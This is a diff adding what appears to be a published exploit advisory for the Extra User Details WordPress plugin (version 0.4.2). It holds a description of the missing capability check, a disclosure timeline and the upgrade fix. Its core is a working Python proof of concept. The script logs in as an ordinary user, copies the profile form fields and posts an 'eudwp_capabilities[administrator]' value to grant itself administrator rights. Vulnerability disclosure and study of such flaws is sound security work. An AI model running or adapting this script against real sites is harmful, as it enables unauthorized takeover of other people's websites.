@@ -1,0 +1,113 @@
+"""
+* Exploit Title: Extra User Details [Privilege Escalation]
+* Discovery Date: 2016-02-13
+* Exploit Author: Panagiotis Vagenas
+* Author Link: https://twitter.com/panVagenas
+* Vendor Homepage: http://vadimk.com/
+* Software Link: https://wordpress.org/plugins/extra-user-details/
+* Version: 0.4.2
+* Tested on: WordPress 4.4.2
+* Category: WebApps, WordPress
+
+
+Description
+-----------
+
+_Extra User Details_ plugin for WordPress suffers from a Privilege
+Escalation
+vulnerability.
+
+The plugin hooks the `eud_update_ExtraFields` function to `profile_update`
+WordPress action. This function doesn't properly check user capabilities
+and
+updates all meta information passed to post data. The only condition is
+that
+the post variable name has the `eud` prefix which is striped before
+updating
+the values in DB.
+
+An attacker can exploit this misbehavior to update the
+{prefix}\_capabilities
+ meta information to gain administrative privileges.
+
+PoC
+---
+
+In the following PoC we assume that the database has the `wp` prefix, a
+very
+common scenario as this is the default WordPress value
+
+"""
+# !/usr/bin/python3
+
+################################################################################
+# Extra User Details Privilege Escalation Exploit
+#
+# Author: Panagiotis Vagenas <pan.vagenas>
+#
+# Dependencies: BeautifulSoup
+(http://www.crummy.com/software/BeautifulSoup/)
+################################################################################
+
+import requests
+from bs4 import BeautifulSoup
+
+baseUrl = 'http://example.com'
+loginUrl = baseUrl + '/wp-login.php'
+profileUrl = baseUrl + '/wp-admin/profile.php'
+
+loginPostData = {
+    'log': 'username',
+    'pwd': 'password',
+    'rememberme': 'forever',
+    'wp-submit': 'Log+In'
+}
+
+s = requests.Session()
+
+r = s.post(loginUrl, loginPostData)
+
+if r.status_code != 200:
+    print('Login error')
+    exit(1)
+
+r = s.get(profileUrl)
+soup = BeautifulSoup(r.text, 'html.parser')
+
+f = soup.find('form', {'id': 'your-profile'})
+if not f:
+    print('Error')
+    exit(1)
+
+data = {
+    'eudwp_capabilities[administrator]': 1,
+}
+
+for i in f.find_all('input'):
+    if 'name' in i.attrs and 'value' in i.attrs and i.attrs['value']:
+        data[i.attrs['name']] = i.attrs['value']
+
+r = s.post(profileUrl, data)
+
+if r.status_code == 200:
+    print('Success')
+
+exit(0)
+
+"""
+
+Solution
+--------
+
+Upgrade to v0.4.2.1
+
+Timeline
+--------
+
+1. **2016-02-13**: Vendor notified through wordpress.org support forums
+2. **2016-02-13**: Vendor notified through through the contact form in
+his website
+3. **2016-02-13**: Vendor responded and received details about this issue
+4. **2016-02-15**: Vendor released v0.4.2.1 which resolves this issue
+
+"""
